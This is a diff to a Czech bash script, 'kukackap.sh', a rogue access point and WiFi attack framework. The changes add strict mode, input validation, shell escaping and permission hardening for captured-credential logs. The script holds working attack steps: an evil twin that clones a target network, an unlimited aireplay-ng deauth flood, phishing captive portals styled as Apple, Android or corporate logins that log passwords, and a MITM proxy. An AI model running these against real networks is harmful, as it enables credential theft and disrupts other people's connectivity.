@@ -8,6 +8,53 @@
 #    /|  |\     POUZE pro vlastní zařízení nebo autorizovaný pentest!
 #
 ###############################################################################
+set -euo pipefail
+IFS=$'\n\t'
+
+usage() {
+    cat <<'USAGE'
+kukackap.sh — Rogue AP & WiFi Lab Framework v1.4.2
+
+POUŽITÍ:
+    sudo ./kukackap.sh [--help] [--debug]
+
+VOLBY:
+    -h, --help    Zobrazí tuto nápovědu a skončí
+    --debug       Zapne trace výpis (set -x) pro ladění
+
+PROMĚNNÉ PROSTŘEDÍ (výchozí hodnoty lze přepsat před spuštěním):
+    AP_IFACE=wlx00c0cab83466   rozhraní pro rogue AP
+    UPSTREAM=wlan0             upstream rozhraní pro NAT
+    SSID=FreeWifi              výchozí SSID
+    CHANNEL=6                  výchozí kanál
+
+Interaktivní menu nabízí 18 režimů — AP/DHCP/NAT, MITM proxy, captive
+portal, evil twin, karma, WPA2/WPA3, PMKID a handshake capture, WPS
+útoky, rogue RADIUS, beacon flood, pasivní monitoring, HTML report.
+
+POUZE pro vlastní zařízení nebo autorizovaný pentest!
+USAGE
+    exit 0
+}
+
+for arg in "$@"; do
+    case "$arg" in
+        -h|--help) usage ;;
+        --debug) set -x ;;
+        *)
+            printf 'Neznámý argument: %s (zkus --help)\n' "$arg" >&2
+            exit 1
+            ;;
+    esac
+done
+
+# Root kontrola musí proběhnout PŘED jakoukoli prací se souborovým systémem
+# (mkdir/chmod na $WORK_DIR níže) — jinak by non-root uživatel dostal
+# matoucí "permission denied" místo srozumitelné hlášky.
+if [ "$EUID" -ne 0 ]; then
+    printf 'Spouštěj jako root (sudo)\n' >&2
+    exit 1
+fi
 
 # === KONFIGURACE ===
 AP_IFACE="${AP_IFACE:-wlx00c0cab83466}"
@@ -22,6 +69,17 @@ MULTI_DHCP_RANGE2="10.0.1.10,10.0.1.50,12h"
 WORK_DIR="/tmp/kukackap"
 LOG_DIR="$WORK_DIR/logs"
 
+# $WORK_DIR/$LOG_DIR drží zachycená hesla (credentials.log, wpe-creds.log,
+# WPA passphrase v ap.conf) — nesmí být čitelné pro ostatní lokální uživatele.
+# Vlastník je SUDO_USER (ne root): GUI terminály se schválně spouští jako
+# přihlášený uživatel (sudo -u $SUDO_USER, kvůli D-Bus/Wayland), takže musí
+# mít přístup ke generovaným .term_*.sh launcherům uvnitř $WORK_DIR.
+mkdir -p "$WORK_DIR" "$LOG_DIR"
+chmod 700 "$WORK_DIR" "$LOG_DIR"
+if [ -n "${SUDO_USER:-}" ]; then
+    chown "$SUDO_USER" "$WORK_DIR" "$LOG_DIR"
+fi
+
 # === BARVY ===
 R=$'\033[0;31m'; G=$'\033[0;32m'; Y=$'\033[1;33m'; B=$'\033[0;34m'
 C=$'\033[0;36m'; M=$'\033[0;35m'; W=$'\033[1;37m'; N=$'\033[0m'
@@ -29,19 +87,19 @@ BOLD=$'\033[1m'
 
 # === RECOVERY DISPLAY POD SUDO ===
 recover_user_env() {
-    [ -z "$SUDO_USER" ] && return
+    [ -z "${SUDO_USER:-}" ] && return
     local pid env_file val
     # Hledáme user session - zkusíme v pořadí různé procesy
     for proc_pattern in gnome-shell plasmashell xfce4-session mate-session lxsession Xwayland Xorg; do
-        pid=$(pgrep -u "$SUDO_USER" -x "$proc_pattern" 2>/dev/null | head -1)
-        [ -z "$pid" ] && pid=$(pgrep -u "$SUDO_USER" -f "$proc_pattern" 2>/dev/null | head -1)
+        pid=$(pgrep -u "${SUDO_USER:-}" -x "$proc_pattern" 2>/dev/null | head -1) || true
+        [ -z "$pid" ] && { pid=$(pgrep -u "${SUDO_USER:-}" -f "$proc_pattern" 2>/dev/null | head -1) || true; }
         [ -n "$pid" ] && break
     done
     [ -z "$pid" ] && return
     env_file="/proc/$pid/environ"
     [ -r "$env_file" ] || return
     for var in DISPLAY WAYLAND_DISPLAY XAUTHORITY XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS; do
-        val=$(tr '\0' '\n' < "$env_file" 2>/dev/null | grep "^${var}=" | head -1 | cut -d= -f2-)
+        val=$(tr '\0' '\n' < "$env_file" 2>/dev/null | grep "^${var}=" | head -1 | cut -d= -f2-) || true
         [ -n "$val" ] && export "$var=$val"
     done
 }
@@ -49,7 +107,7 @@ recover_user_env
 
 # === DETEKCE TERMINÁLU ===
 detect_terminal() {
-    if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
+    if [ -n "${DISPLAY:-}" ] || [ -n "${WAYLAND_DISPLAY:-}" ]; then
         for term in ptyxis kgx gnome-terminal xfce4-terminal konsole mate-terminal lxterminal terminator tilix alacritty kitty xterm; do
             command -v "$term" &>/dev/null && { echo "$term"; return; }
         done
@@ -79,11 +137,11 @@ EOF
     case "$TERM_CMD" in
         ptyxis)
             # Ptyxis - GNOME nový terminál (sudo problémy s D-Bus, raději přes user)
-            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
-                sudo -u "$SUDO_USER" \
-                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
-                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
-                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
+            if [ -n "${SUDO_USER:-}" ] && [ "$EUID" -eq 0 ]; then
+                sudo -u "${SUDO_USER:-}" \
+                    DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
+                    XAUTHORITY="${XAUTHORITY:-}" XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
+                    DBUS_SESSION_BUS_ADDRESS="${DBUS_SESSION_BUS_ADDRESS:-}" \
                     ptyxis --new-window --title="$title" -- bash "$script_file" &
             else
                 ptyxis --new-window --title="$title" -- bash "$script_file" &
@@ -91,32 +149,32 @@ EOF
             ;;
         kgx)
             # GNOME Console
-            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
-                sudo -u "$SUDO_USER" \
-                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
-                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
-                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
+            if [ -n "${SUDO_USER:-}" ] && [ "$EUID" -eq 0 ]; then
+                sudo -u "${SUDO_USER:-}" \
+                    DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
+                    XAUTHORITY="${XAUTHORITY:-}" XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
+                    DBUS_SESSION_BUS_ADDRESS="${DBUS_SESSION_BUS_ADDRESS:-}" \
                     kgx --title="$title" -e "bash $script_file" &
             else
                 kgx --title="$title" -e "bash $script_file" &
             fi
             ;;
         gnome-terminal)
-            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
-                sudo -u "$SUDO_USER" \
-                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
-                    XAUTHORITY="$XAUTHORITY" XDG_RUNTIME_DIR="$XDG_RUNTIME_DIR" \
-                    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
+            if [ -n "${SUDO_USER:-}" ] && [ "$EUID" -eq 0 ]; then
+                sudo -u "${SUDO_USER:-}" \
+                    DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
+                    XAUTHORITY="${XAUTHORITY:-}" XDG_RUNTIME_DIR="${XDG_RUNTIME_DIR:-}" \
+                    DBUS_SESSION_BUS_ADDRESS="${DBUS_SESSION_BUS_ADDRESS:-}" \
                     gnome-terminal --title="$title" -- bash "$script_file" &
             else
                 gnome-terminal --title="$title" -- bash "$script_file" &
             fi
             ;;
         xfce4-terminal)
-            if [ -n "$SUDO_USER" ] && [ "$EUID" -eq 0 ]; then
-                sudo -u "$SUDO_USER" \
-                    DISPLAY="$DISPLAY" WAYLAND_DISPLAY="$WAYLAND_DISPLAY" \
-                    XAUTHORITY="$XAUTHORITY" \
+            if [ -n "${SUDO_USER:-}" ] && [ "$EUID" -eq 0 ]; then
+                sudo -u "${SUDO_USER:-}" \
+                    DISPLAY="${DISPLAY:-}" WAYLAND_DISPLAY="${WAYLAND_DISPLAY:-}" \
+                    XAUTHORITY="${XAUTHORITY:-}" \
                     xfce4-terminal --title="$title" --command="bash $script_file" &
             else
                 xfce4-terminal --title="$title" --command="bash $script_file" &
@@ -158,18 +216,60 @@ EOF
 
 attach_tmux_if_needed() {
     if [ "$TERM_CMD" = "tmux" ]; then
-        echo "${G}[+] tmux session 'kukackap' běží${N}"
-        echo "${Y}    Připoj se: ${W}tmux attach -t kukackap${N}"
-        echo "${Y}    Mezi okny: Ctrl+B  N (next) / P (prev) / 0..9 (číslo)${N}"
-        echo "${Y}    Detach:    Ctrl+B  D${N}"
+        log INFO "${G}[+] tmux session 'kukackap' běží${N}"
+        log WARN "${Y}    Připoj se: ${W}tmux attach -t kukackap${N}"
+        log WARN "${Y}    Mezi okny: Ctrl+B  N (next) / P (prev) / 0..9 (číslo)${N}"
+        log WARN "${Y}    Detach:    Ctrl+B  D${N}"
     fi
 }
 
 # === HELPERS ===
-need_root() {
-    [ "$EUID" -ne 0 ] && { echo "${R}[!] Spouštěj jako root (sudo)${N}"; exit 1; }
-}
+# (root kontrola proběhla už na začátku souboru, před mkdir na $WORK_DIR)
 check_tool() { command -v "$1" &>/dev/null; }
+
+# Jednotné logování. Úroveň INFO/WARN jde na stdout, ERR na stderr
+# (CLAUDE.md: "Chyby na stderr, data na stdout — nemíchej").
+log() {
+    local level="$1"; shift
+    if [ "$level" = "ERR" ]; then
+        printf '%s\n' "$*" >&2
+    else
+        printf '%s\n' "$*"
+    fi
+}
+
+# Shell-escapuje řetězec pro bezpečné vložení do generovaného příkazu (open_term).
+# Nutné pro každou hodnotu ze `read`, která skončí v cmd stringu — brání shell
+# injection přes SSID/BSSID/název souboru obsahující ; | & $ ` " ' ( ) apod.
+shq() { printf '%q' "$1"; }
+
+# Ověří formát BSSID (AA:BB:CC:DD:EE:FF), case-insensitive.
+is_valid_bssid() {
+    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
+}
+
+# Ověří, že kanál je celé číslo v rozumném rozsahu (1-14 2.4GHz, 36-165 5GHz).
+is_valid_channel() {
+    [[ "$1" =~ ^[0-9]+$ ]] && [ "$1" -ge 1 ] && [ "$1" -le 196 ]
+}
+
+# === BOX-DRAWING HELPERY ===
+# Šířka se počítá z viditelného textu (barevné escape kódy se pro výpočet
+# stripnou) — obsah řádku a rámeček tak zůstanou zarovnané i po úpravě textu,
+# bez ručního dopočítávání mezer.
+readonly BOX_W=73
+
+box_top()  { printf "%s╔%s╗%s\n" "$C" "$(printf '═%.0s' $(seq 1 "$BOX_W"))" "$N"; }
+box_mid()  { printf "%s╟%s╢%s\n" "$C" "$(printf '─%.0s' $(seq 1 "$BOX_W"))" "$N"; }
+box_bot()  { printf "%s╚%s╝%s\n" "$C" "$(printf '═%.0s' $(seq 1 "$BOX_W"))" "$N"; }
+box_line() {
+    local rendered="$1" plain pad
+    plain=$(printf '%s' "$rendered" | sed -E 's/\x1b\[[0-9;]*m//g')
+    pad=$(( BOX_W - ${#plain} ))
+    (( pad < 0 )) && pad=0
+    printf "%s│%s%s%*s%s│%s\n" "$C" "$N" "$rendered" "$pad" "" "$C" "$N"
+}
+box_head() { box_line " ${BOLD}${W}$1${N}"; }
 
 banner() {
     clear
@@ -182,16 +282,21 @@ banner() {
   ██║  ██╗╚██████╔╝██║  ██╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝
 EOF
-    printf "%s\n" "${N}${BOLD}            Rogue AP & WiFi Lab Framework  v1.4.2${N}"
-    printf "%s\n\n" "${M}                  \"Cizí hnízdo, naše vejce.\"${N}"
+    printf "%s\n" "${N}"
+    printf "  %s%sRogue AP & WiFi Lab Framework%s  %s· v1.4.2%s\n" "${BOLD}" "${W}" "${N}" "${C}" "${N}"
+    printf "  %s\"Cizí hnízdo, naše vejce.\"%s\n\n" "${M}" "${N}"
 
-    # Kukačka z profilu — kulatá hlava + zobák vpravo (žádné kočičí uši)
-    local B1='  .---,   ' B2=' ( o   \> ' B3=' ( ~~~  ) ' B4="  '----'  " B5='  /|  |\\  '
-    printf "%s%s%s  %sAP iface  :%s %s%s%s\n" "$C" "$B1" "$N" "$W" "$N" "$G" "$AP_IFACE" "$N"
-    printf "%s%s%s  %sUpstream  :%s %s%s%s\n" "$C" "$B2" "$N" "$W" "$N" "$G" "$UPSTREAM" "$N"
-    printf "%s%s%s  %sSSID      :%s %s%s%s    %sKanál:%s %s%s%s\n" "$C" "$B3" "$N" "$W" "$N" "$G" "$SSID" "$N" "$W" "$N" "$G" "$CHANNEL" "$N"
-    printf "%s%s%s  %sTerminál  :%s %s%s%s\n" "$C" "$B4" "$N" "$W" "$N" "$G" "$TERM_CMD" "$N"
-    printf "%s%s%s  %sWorkDir   :%s %s%s%s\n" "$C" "$B5" "$N" "$W" "$N" "$G" "$WORK_DIR" "$N"
+    # Kukačka z profilu — kulatá hlava + zobák vpravo
+    local B1='  .---,   ' B2=' ( o   \> ' B3=' ( ~~~  ) ' B4="  '----'  " B5='  /|  |\  '
+
+    box_top
+    box_line "${C}${B1}${N}  ${W}AP iface  :${N} ${G}${AP_IFACE}${N}"
+    box_line "${C}${B2}${N}  ${W}Upstream  :${N} ${G}${UPSTREAM}${N}"
+    box_line "${C}${B3}${N}  ${W}SSID      :${N} ${G}${SSID}${N}   ${W}Kanál:${N} ${G}${CHANNEL}${N}"
+    box_line "${C}${B4}${N}  ${W}Terminál  :${N} ${G}${TERM_CMD}${N}"
+    box_line "${C}${B5}${N}  ${W}WorkDir   :${N} ${G}${WORK_DIR}${N}"
+    box_bot
+
     if [ "$TERM_CMD" = "none" ]; then
         printf "\n  %s[!] Žádný GUI terminál nedetekován.%s\n" "$Y" "$N"
         printf "      %sZkus:  sudo -E bash kukackap.sh%s\n" "$W" "$N"
@@ -205,26 +310,34 @@ mode_settings() {
     while true; do
         clear
         banner
-        printf "${C}┌──── Nastavení ────┐${N}\n"
-        printf "${C}│${N}  ${G}1)${N} Změnit SSID (aktuálně: ${G}$SSID${N})\n"
-        printf "${C}│${N}  ${G}2)${N} Změnit kanál (aktuálně: ${G}$CHANNEL${N})\n"
-        printf "${C}│${N}  ${G}3)${N} Změnit AP rozhraní (aktuálně: ${G}$AP_IFACE${N})\n"
-        printf "${C}│${N}  ${G}4)${N} Změnit upstream (aktuálně: ${G}$UPSTREAM${N})\n"
-        printf "${C}│${N}  ${W}b)${N} Zpět\n"
-        printf "${C}└───────────────────┘${N}\n\n"
+        box_top
+        box_head "Nastavení"
+        box_line "  ${G}1)${N} Změnit SSID (aktuálně: ${G}${SSID}${N})"
+        box_line "  ${G}2)${N} Změnit kanál (aktuálně: ${G}${CHANNEL}${N})"
+        box_line "  ${G}3)${N} Změnit AP rozhraní (aktuálně: ${G}${AP_IFACE}${N})"
+        box_line "  ${G}4)${N} Změnit upstream (aktuálně: ${G}${UPSTREAM}${N})"
+        box_line "  ${W}b)${N} Zpět"
+        box_bot
+        echo
         read -p "$(printf "%snastavení%s❯ " "$BOLD" "$N")" sub
         case "$sub" in
             1)
                 read -p "Nový SSID [${SSID}]: " new
                 [ -n "$new" ] && SSID="$new"
-                echo "${G}[+] SSID = $SSID${N}"; sleep 1
+                log INFO "${G}[+] SSID = $SSID${N}"; sleep 1
                 ;;
             2)
                 echo "  Doporučené kanály 2.4 GHz: 1, 6, 11"
                 echo "  Pro 5 GHz (pokud karta umí): 36, 40, 44, 48"
                 read -p "Nový kanál [${CHANNEL}]: " new
-                [ -n "$new" ] && CHANNEL="$new"
-                echo "${G}[+] Kanál = $CHANNEL${N}"; sleep 1
+                if [ -n "$new" ]; then
+                    if is_valid_channel "$new"; then
+                        CHANNEL="$new"
+                    else
+                        log ERR "${R}[!] Neplatný kanál — musí být číslo 1-196${N}"; sleep 1; continue
+                    fi
+                fi
+                log INFO "${G}[+] Kanál = $CHANNEL${N}"; sleep 1
                 ;;
             3)
                 pick_ap_iface
@@ -252,9 +365,9 @@ pick_ap_iface() {
         ifaces+=("$ifname")
         i=$((i+1))
 
-        local phy=$(iw dev "$ifname" info 2>/dev/null | awk '/wiphy/ {print "phy"$2}')
-        local type=$(iw dev "$ifname" info 2>/dev/null | awk '/type/ {print $2}')
-        local driver=$(basename "$(readlink /sys/class/net/$ifname/device/driver 2>/dev/null)" 2>/dev/null)
+        local phy; phy=$(iw dev "$ifname" info 2>/dev/null | awk '/wiphy/ {print "phy"$2}') || true
+        local type; type=$(iw dev "$ifname" info 2>/dev/null | awk '/type/ {print $2}') || true
+        local driver; driver=$(basename "$(readlink /sys/class/net/$ifname/device/driver 2>/dev/null)" 2>/dev/null) || true
         [ -z "$driver" ] && driver="?"
 
         # Umí AP mode?
@@ -264,7 +377,7 @@ pick_ap_iface() {
         fi
 
         # Stav
-        local state=$(ip -br link show "$ifname" 2>/dev/null | awk '{print $2}')
+        local state; state=$(ip -br link show "$ifname" 2>/dev/null | awk '{print $2}') || true
         local current=""
         [ "$ifname" = "$AP_IFACE" ] && current=" ${Y}[aktuální]${N}"
 
@@ -273,7 +386,7 @@ pick_ap_iface() {
     done < <(iw dev 2>/dev/null | awk '/Interface/ {print $2}')
 
     if [ ${#ifaces[@]} -eq 0 ]; then
-        echo "${R}[!] Nenalezena žádná WiFi karta${N}"
+        log ERR "${R}[!] Nenalezena žádná WiFi karta${N}"
         sleep 2
         return
     fi
@@ -284,7 +397,7 @@ pick_ap_iface() {
     read -p "Vyber číslo [Enter = ponechat]: " num
     if [[ "$num" =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le ${#ifaces[@]} ]; then
         AP_IFACE="${ifaces[$((num-1))]}"
-        echo "${G}[+] AP iface = $AP_IFACE${N}"
+        log INFO "${G}[+] AP iface = $AP_IFACE${N}"
         sleep 1
     fi
 }
@@ -300,7 +413,7 @@ pick_upstream() {
     local i=0
 
     # Sesbírej všechna nelokal rozhraní (Ethernet + WiFi v managed/spojená)
-    while read -r ifname state; do
+    while IFS=' ' read -r ifname state; do
         [ "$ifname" = "lo" ] && continue
         [ -z "$ifname" ] && continue
         # Skip AP rozhraní samotné
@@ -317,17 +430,17 @@ pick_upstream() {
         local iftype="ether"
         if iw dev "$ifname" info &>/dev/null; then
             iftype="wifi"
-            local wtype=$(iw dev "$ifname" info | awk '/type/ {print $2}')
+            local wtype; wtype=$(iw dev "$ifname" info | awk '/type/ {print $2}') || true
             [ -n "$wtype" ] && iftype="wifi/$wtype"
         fi
 
         # IP adresa
-        local ipaddr=$(ip -4 addr show "$ifname" 2>/dev/null | awk '/inet / {print $2; exit}')
+        local ipaddr; ipaddr=$(ip -4 addr show "$ifname" 2>/dev/null | awk '/inet / {print $2; exit}') || true
         [ -z "$ipaddr" ] && ipaddr="-"
 
         # Konektivita - test default route
         local conn="${R}NE${N}"
-        local def_via=$(ip route show default 2>/dev/null | awk -v ifn="$ifname" '$0 ~ "dev "ifn" " {print $3; exit}')
+        local def_via; def_via=$(ip route show default 2>/dev/null | awk -v ifn="$ifname" '$0 ~ "dev "ifn" " {print $3; exit}') || true
         if [ -n "$def_via" ]; then
             conn="${G}internet${N}"
         elif [ "$ipaddr" != "-" ]; then
@@ -342,7 +455,7 @@ pick_upstream() {
     done < <(ip -br link show | awk '{print $1, $2}')
 
     if [ ${#ifaces[@]} -eq 0 ]; then
-        echo "${R}[!] Žádné použitelné upstream rozhraní${N}"
+        log ERR "${R}[!] Žádné použitelné upstream rozhraní${N}"
         sleep 2
         return
     fi
@@ -353,13 +466,13 @@ pick_upstream() {
     read -p "Vyber číslo [Enter = ponechat]: " num
     if [[ "$num" =~ ^[0-9]+$ ]] && [ "$num" -ge 1 ] && [ "$num" -le ${#ifaces[@]} ]; then
         UPSTREAM="${ifaces[$((num-1))]}"
-        echo "${G}[+] Upstream = $UPSTREAM${N}"
+        log INFO "${G}[+] Upstream = $UPSTREAM${N}"
         sleep 1
     fi
 }
 
 prepare_iface() {
-    echo "${Y}[*] Příprava rozhraní $AP_IFACE${N}"
+    log WARN "${Y}[*] Příprava rozhraní $AP_IFACE${N}"
     rfkill unblock wifi 2>/dev/null || true
     systemctl stop firewalld 2>/dev/null || true
     pkill hostapd 2>/dev/null || true
@@ -375,7 +488,7 @@ prepare_iface() {
     ip addr flush dev "$AP_IFACE" 2>/dev/null || true
     ip addr add "$AP_IP/24" dev "$AP_IFACE"
     mkdir -p "$WORK_DIR" "$LOG_DIR"
-    echo "${G}[+] Rozhraní připraveno${N}"
+    log INFO "${G}[+] Rozhraní připraveno${N}"
 }
 
 write_hostapd_open() {
@@ -474,7 +587,7 @@ EOF
 }
 
 setup_nat_multi() {
-    echo "${Y}[*] NAT přes $UPSTREAM (multi-SSID)${N}"
+    log WARN "${Y}[*] NAT přes $UPSTREAM (multi-SSID)${N}"
     sysctl -w net.ipv4.ip_forward=1 >/dev/null
     iptables -t nat -F
     iptables -F FORWARD
@@ -519,12 +632,12 @@ EOF
 setup_nat() {
     # Detekuj skutečné výchozí rozhraní — může se lišit od $UPSTREAM při aktivním VPN
     local real_upstream
-    real_upstream=$(ip route get 8.8.8.8 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1)
+    real_upstream=$(ip route get 8.8.8.8 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1) || true
     if [ -n "$real_upstream" ] && [ "$real_upstream" != "$UPSTREAM" ]; then
-        echo "${Y}[!] VPN/jiná trasa detekována: použit $real_upstream místo $UPSTREAM${N}"
+        log WARN "${Y}[!] VPN/jiná trasa detekována: použit $real_upstream místo $UPSTREAM${N}"
         UPSTREAM="$real_upstream"
     fi
-    echo "${Y}[*] NAT přes $UPSTREAM${N}"
+    log WARN "${Y}[*] NAT přes $UPSTREAM${N}"
     sysctl -w net.ipv4.ip_forward=1 >/dev/null
     iptables -t nat -F
     iptables -F FORWARD
@@ -708,9 +821,15 @@ launch_eapol_capture() {
 }
 
 # === CLEANUP ===
+# Guard proti dvojímu spuštění: cleanup() se volá i přímo (wait_for_user, menu
+# "k)"), a ten přímý běh sám dělá `exit 0` — to by bez guardu znovu nahodilo
+# EXIT trap a spustilo cleanup podruhé (duplicitní pkill/hlášky).
+CLEANUP_DONE=0
 cleanup() {
+    [ "$CLEANUP_DONE" -eq 1 ] && return
+    CLEANUP_DONE=1
     echo
-    echo "${Y}[*] Cleanup...${N}"
+    log WARN "${Y}[*] Cleanup...${N}"
     pkill hostapd 2>/dev/null || true
     pkill hostapd-wpe 2>/dev/null || true
     pkill -f "dnsmasq -C $WORK_DIR" 2>/dev/null || true
@@ -725,23 +844,23 @@ cleanup() {
     pkill bully 2>/dev/null || true
     pkill -f "$WORK_DIR/chanhop.sh" 2>/dev/null || true
     pkill -f "$WORK_DIR/clients.sh" 2>/dev/null || true
-    iptables -t nat -F
-    iptables -F FORWARD
+    iptables -t nat -F 2>/dev/null || true
+    iptables -F FORWARD 2>/dev/null || true
     ip addr flush dev "$AP_IFACE" 2>/dev/null || true
     ip link set "$AP_IFACE" down 2>/dev/null || true
     nmcli device set "$AP_IFACE" managed yes 2>/dev/null || true
     [ "$TERM_CMD" = "tmux" ] && tmux kill-session -t kukackap 2>/dev/null || true
-    rm -f "$WORK_DIR"/.term_*.sh 2>/dev/null
-    echo "${G}[+] Hotovo. Logy: $LOG_DIR${N}"
+    rm -f "$WORK_DIR"/.term_*.sh 2>/dev/null || true
+    log INFO "${G}[+] Hotovo. Logy: $LOG_DIR${N}"
     exit 0
 }
-trap cleanup INT TERM
+trap cleanup EXIT INT TERM
 
 wait_for_user() {
     attach_tmux_if_needed
     echo
     echo "${C}════════════════════════════════════════════${N}"
-    echo "${G}  ${BOLD}ENTER${N}${G} = stop & cleanup${N}"
+    log INFO "${G}  ${BOLD}ENTER${N}${G} = stop & cleanup${N}"
     echo "${C}════════════════════════════════════════════${N}"
     read -r
     cleanup
@@ -758,10 +877,10 @@ mode_open_ap() {
 mode_wpa2_ap() {
     echo "${B}═══ MODE 2: WPA2 AP + DHCP + NAT ═══${N}"
     read -p "Heslo (min 8 znaků): " pw
-    [ ${#pw} -lt 8 ] && { echo "Příliš krátké"; exit 1; }
+    [ ${#pw} -lt 8 ] && { log ERR "${R}Příliš krátké${N}"; return; }
     prepare_iface; write_hostapd_wpa2 "$pw"; write_dnsmasq; setup_nat
     launch_hostapd; launch_dnsmasq; launch_leases
-    echo "${G}[+] WPA2 SSID '$SSID' / heslo: $pw${N}"
+    log INFO "${G}[+] WPA2 SSID '$SSID' / heslo: $pw${N}"
     wait_for_user
 }
 
@@ -775,23 +894,23 @@ mode_pcap() {
 mode_mitm() {
     echo "${B}═══ MODE 4: MITM HTTPS proxy ═══${N}"
     if ! check_tool mitmweb; then
-        echo "${R}[!] mitmweb chybí. Nainstaluj:${N}"
+        log ERR "${R}[!] mitmweb chybí. Nainstaluj:${N}"
         echo "    sudo apt install pipx && pipx install mitmproxy"
-        exit 1
+        return
     fi
     prepare_iface; write_hostapd_open; write_dnsmasq
     setup_nat; setup_mitm_redirect
     launch_hostapd; launch_dnsmasq; launch_mitm; launch_leases
-    echo "${Y}[*] Klient: http://mitm.it pro CA cert${N}"
-    echo "${Y}[*] Web UI: http://$AP_IP:8081${N}"
+    log WARN "${Y}[*] Klient: http://mitm.it pro CA cert${N}"
+    log WARN "${Y}[*] Web UI: http://$AP_IP:8081${N}"
     wait_for_user
 }
 
 mode_captive_portal() {
     echo "${B}═══ MODE 5: Captive Portal ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní zařízení / autorizace!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní zařízení / autorizace!${N}"
     read -p "Pokračovat? (y/N): " ok
-    [ "$ok" != "y" ] && exit 0
+    [ "$ok" != "y" ] && return
     echo
     printf "${Y}Šablona portálu:${N}\n"
     printf "  ${G}1)${N} Apple iOS style\n"
@@ -804,37 +923,43 @@ mode_captive_portal() {
     write_dnsmasq_sinkhole
     write_captive_portal_server
     case "$tmpl" in
-        2) write_portal_html_android; echo "${G}[+] Šablona: Android Material${N}" ;;
-        3) write_portal_html_corp;    echo "${G}[+] Šablona: Corporate${N}" ;;
-        *) write_portal_html_apple;   echo "${G}[+] Šablona: Apple iOS${N}" ;;
+        2) write_portal_html_android; log INFO "${G}[+] Šablona: Android Material${N}" ;;
+        3) write_portal_html_corp;    log INFO "${G}[+] Šablona: Corporate${N}" ;;
+        *) write_portal_html_apple;   log INFO "${G}[+] Šablona: Apple iOS${N}" ;;
     esac
     sysctl -w net.ipv4.ip_forward=0 >/dev/null
     iptables -t nat -F
     iptables -F FORWARD
     launch_hostapd; launch_dnsmasq; launch_dnsqueries; launch_portal
     open_term "credentials" "sudo touch $LOG_DIR/credentials.log; sudo tail -F $LOG_DIR/credentials.log"
-    echo "${G}[+] Captive portal aktivní${N}"
+    log INFO "${G}[+] Captive portal aktivní${N}"
     wait_for_user
 }
 
 mode_evil_twin() {
     echo "${B}═══ MODE 6: Evil Twin ═══${N}"
-    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
+    log ERR "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
     read -p "Pokračovat? (y/N): " ok
-    [ "$ok" != "y" ] && exit 0
-    echo "${Y}[*] Skenuji okolí přes $UPSTREAM...${N}"
+    [ "$ok" != "y" ] && return
+    log WARN "${Y}[*] Skenuji okolí přes $UPSTREAM...${N}"
     iw dev "$UPSTREAM" scan 2>/dev/null | awk '
         /^BSS / {bssid=$2; gsub(/\(.*/,"",bssid)}
         /freq:/ {freq=$2}
         /signal:/ {signal=$2}
         /SSID:/ {ssid=substr($0, index($0,$2));
                  if (ssid != "" && ssid != "\\x00") printf "%-20s %-30s %s dBm  %s MHz\n", bssid, ssid, signal, freq}
-    ' | sort -u | head -30 | nl
+    ' | sort -u | head -30 | nl || true
     echo
     read -p "Cílový SSID: " target_ssid
     read -p "Cílový BSSID [Enter pro nepoužít]: " target_bssid
+    if [ -n "$target_bssid" ] && ! is_valid_bssid "$target_bssid"; then
+        log ERR "${R}[!] Neplatný formát BSSID (očekáváno AA:BB:CC:DD:EE:FF)${N}"; return
+    fi
     read -p "Kanál [$CHANNEL]: " target_ch
-    [ -n "$target_ch" ] && CHANNEL="$target_ch"
+    if [ -n "$target_ch" ]; then
+        is_valid_channel "$target_ch" || { log ERR "${R}[!] Neplatný kanál${N}"; return; }
+        CHANNEL="$target_ch"
+    fi
     SSID="$target_ssid"
     prepare_iface
     write_hostapd_open "$target_ssid" "$target_bssid"
@@ -846,22 +971,22 @@ mode_evil_twin() {
         read -p "Spustit deauth flood proti $target_bssid? (y/N): " do_deauth
         if [ "$do_deauth" = "y" ]; then
             read -p "Monitor interface: " mon_if
-            [ -n "$mon_if" ] && open_term "deauth" "sudo aireplay-ng --deauth 0 -a $target_bssid $mon_if"
+            [ -n "$mon_if" ] && open_term "deauth" "sudo aireplay-ng --deauth 0 -a $(shq "$target_bssid") $(shq "$mon_if")"
         fi
     fi
-    echo "${G}[+] Evil Twin '$target_ssid' běží${N}"
